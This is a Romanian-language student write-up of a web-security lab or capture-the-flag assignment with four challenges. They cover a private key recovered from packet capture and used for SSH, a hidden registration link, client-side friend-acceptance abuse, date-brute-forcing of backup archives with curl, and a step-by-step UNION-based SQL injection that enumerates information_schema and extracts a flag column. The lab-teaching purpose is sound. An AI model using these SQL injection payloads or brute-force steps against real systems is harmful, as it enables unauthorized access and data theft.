# Tema 2 TSSC - Securitate Web
## Cerinta 1
```
SpeishFlag{JdYwzaWeoObO84QKtMl93jWMsRPKx8UV}
```
Doar am deschis `traffic.pcap` in *Wireshark* si am cautat prin raspunsurile
primite de la server pana am gasit cheia privata, cu care m-am logat prin *SSH*
la endpointul din enunt:
```bash
teo@obor task1 $ ssh -i id_rsa secure@isc2021.root.sx
You did it! Congratulations!

Your flag is:

SpeishFlag{JdYwzaWeoObO84QKtMl93jWMsRPKx8UV}

Connection to isc2021.root.sx closed.
```


## Cerinta 2
### Primul flag
```
SpeishFlag{xesOb3jmqp2o99u5R3X0E8jMLse9WNZn}
```

Am observat ca butonul de `register` ma duce spre calea `/auth/fake_login`, asa
ca m-am uitat in codul sursa *HTML* al paginii, unde am gasit un comentariu
catre likul real de login: `/auth/register_real_one`. Mi-am facut cont, m-am
logat cu el si m-am uitat din nou in codul sursa al paginii, de data aceasta in
cel al caii: `/inside`, unde am gasit flagul.


### Al doilea flag
```
SpeishFlag{bwZjYXYnJ0f8ucN8yoGB3KF6t7AFtHnQ}
```

Initial, am incercat sa-i dau *friend request* bossului. Degeaba. Iar m-am uitat
in codul site-ului si apoi in `main.js` si am observat ca e destul sa apelez eu,
de pe profilul meu, `acceptFriend(boss_id)` ca bossul sa imi accepte si el
cererea. Am incercat sa apelez `acceptFriend(theboss)` si n-a mers. Asa ca am
sperat ca poate id-urile ar putea fi ca intr-o baza de date. Am incercat 0 si 1,
iar 1 a mers, iar pe profilul bossului am gasit flagul.


### Al treilea flag
```
SpeishFlag{FPFcPKwWeeDvGNGsl281MYyT5vU1W3t3}
```

Pe wallul bossului am gasit scriptul `backup.sh`, cu care serverul arhiveaza
directorul curent (inca nu se stie care e) in fisierul `backup-orig.tar.gz`. De
asemenea, scriptul arhiveaza si /fisierul `flag.txt` in `/tmp/flag.tar.gz`, iar
la final concateneaza aceste 2 arhive in fisierul
`backup-<data curenta>.tar.gz`.

Dar nu stiam unde e `backup.sh` (probabil `backup-<data curenta>.tar.gz` e in
acelasi director), asa ca am descarcat intregul director de la `localhost:8080`,
prin `wget`, folosind cookie-urile luate din browser, pentru a pastra
autentificarea la server:
```
wget -r http://localhost:8080/ --load-cookies cookies
```
Uitandu-ma prin directoarele serverului, am vazut ca `backup.sh` se afla in
radacina, deci probabil si `backup-<data curenta>.tar.gz` e in acelasi loc. Ca
sa ghicesc data, am facut scriptul `bruteforce_dates.sh` in care am luat la rand
datele din secolul al XXI-lea si am incercat sa dau `curl` la
```
curl -b cookies -f --silent --output backup.tar.gz http://localhost:8080/backup-<data>.tar.gz
```
pana am gasit data buna, care e `2021-04-11`. Am cautat apoi unde incepe arhiva
cu flagul. Headerul unui fisier `.tar.gz` incepe cu `0x1f 0x8b 0x08`. Am gasit
3 indecsi in binar la care se gasesc cei 3 octeti enumerati anterior. Primul e 0
(duh...), al 2-lea e intamplator, iar al 3-lea e headerul legit, la indexul
`0x381dcf`.

Ce a urmat a fost sa extrag ultima parte a fisierului, de la indexul gasit:
```
tail -c +$((16#381dd0)) backup.tar.gz > flag.tar.gz
```
iar in fisierul `flag.txt` rezultat din dezarhivarea arhivei `flag.tar.gz`, se
gaseste flagul.


### Al patrulea flag
```
SpeishFlag{jOIIw4CsMqbdEzruk5cve73bfIuTee1p}
```

Folsind `sqlmap`, am vazut ca endpointul vulnerabil este
`http://localhost:8080/inside/p/`. ID-ul care urmeaza dupa `/p/` este trimis
direct in cererea catre baza de date.

Asadar, am procedat clasic si am inceput prin a afla numarul de coloane prin
payloadul:
```
' or 1 order by 1,2,3,4,5,6,7,8,9,10 -- x 
```
Serverul dadea erorae la coloana 9, deci sunt 8 coloane. Apoi am dat payloadul
de mai sus doar pana la 8 pentru a vedea care coloana e afisata. E coloana 3.

Acum am nevoie sa aflu care e schema din care face parte tabela cu flagul.
In consecinta, am folosit cererea de mai jos. De precizat e ca apar multe
duplicate, iar serverul trunchiaza outputul, drept care am folosit `distinct`.
```
' union select 1, 2, group_concat(distinct(table_schema) separator ','), 4, 5, 6, 7, 8 from information_schema.tables -- x
```
Asa am vazut ca shema se cheama `web_5371`.

Folosind schema asta, am cautat toate tabelele din ea folosind cererea de mai
jos:
```
' union select 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 from information_schema.tables where table_schema='web_5371' -- x
```
Si am vazut ca printre tabele generice precum `accounts` se gasea si
`flags9174`, care probabil contine flagul.

Acum tot ce imi mai trebuia era sa stiu numele coloanei ce contine flagul.
Pentru asta am folosit cererea de mai jos, prin care am afisat numele tututor
coloanelor din `web_5371.flags9174`.
```
' union select 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 from information_schema.columns where table_schema='web_5371' and table_name='flags9174' -- x
```
Tabela contine 2 coloane: `id` si `zaflag`. Deci flagul trebuie sa fie in cea
de-a doua coloana.

Cu ultima cerere am obtinut chiar flagul de mai sus:
```
' union select 1, 2, zaflag, 4, 5, 6, 7, 8 from web_5371.flags9174 -- x
```
